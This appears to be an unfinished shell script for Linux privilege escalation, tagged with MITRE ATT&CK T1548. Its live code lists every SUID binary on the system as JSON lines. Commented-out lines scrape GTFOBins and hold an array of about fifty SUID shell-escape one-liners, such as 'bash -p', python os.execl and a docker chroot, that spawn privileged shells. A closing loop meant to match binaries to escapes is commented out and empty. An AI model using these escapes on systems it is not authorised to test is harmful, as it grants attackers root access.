# # test=$(curl https://gtfobins.github.io/\#+suid 2>/dev/null | grep "class=\"bin-name\"" | awk -F '>' '{print $3}' | awk -F '<' '{print $1}' | tr '\n' ' ')
# test=($(curl https://gtfobins.github.io/\#+suid 2>/dev/null | grep "class=\"bin-name\"" | awk -F '>' '{print $3}' | awk -F '<' '{print $1}' | tr '\n' ' ' | xargs printf "\"%s\" "))
# echo "$test";

# suidGTFO=("ash " "bash -p" "busybox sh" "chroot / /bin/sh -p" "csh -b" "dash -p" "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" "emacs -Q -nw --eval '(term \"/bin/sh -p\")'" "env /bin/sh -p" "expect -c \"spawn /bin/sh -p;interact\"" "find . -exec /bin/sh -p \; -quit" "flock -u / /bin/sh -p" "gawk 'BEGIN {system(\"/bin/sh\")}'" "gdb -q -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit" "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" "ionice /bin/sh -p" "jrunscript -e \"exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"" "ksh -p" "ld.so /bin/sh -p" "logsave /dev/null /bin/sh -i -p" "lua -e 'os.execute(\"/bin/sh\")'" "make -s --eval=$'x:\n\t-'\"/bin/sh -p\"" "mawk 'BEGIN {system(\"/bin/sh\")}'" "nice /bin/sh -p" "node node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'" "perl -e 'exec \"/bin/sh\";'" "php -r \"pcntl_exec('/bin/sh', ['-p']);\"" "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" "python2 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" "rlwrap -H /dev/null /bin/sh -p" "rpm --eval '%{lua:os.execute(\"/bin/sh\", \"-p\")}'" "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\", \"-p\")}'" "rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null" "run-parts --new-session --regex '^sh$' /bin --arg='-p'" "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'" "setarch $(arch) /bin/sh -p" "sh -p" "start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p" "stdbuf -i0 /bin/sh -p" "strace -o /dev/null /bin/sh -p" "taskset 1 /bin/sh -p" "time /bin/sh -p" "timeout 7d /bin/sh -p" "unshare -r /bin/sh" "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'" "watch -x sh -c 'reset; exec sh 1>&0 2>&0'" "xargs -a /dev/null sh -p" "zsh ")

# x=($(find / -perm -4000 -type f 2>/dev/null | sed 's:.*/\(.*\):"\1":' | tr '\n' ', ' ))
x=($(find / -perm -4000 -type f 2>/dev/null | sed 's:.*/::' | tr '\n' ' '))
for suid in $x;do
    echo '{"suid": "'"$suid"'"}'
done;

# echo '{"suid.T1548": ['${x[@]}']}'

#     for i in $(cat output);do
#         for ((suid = 0; suid < ${#suidGTFO[@]}; suid++));do
            
#         done;
#     done;
# done;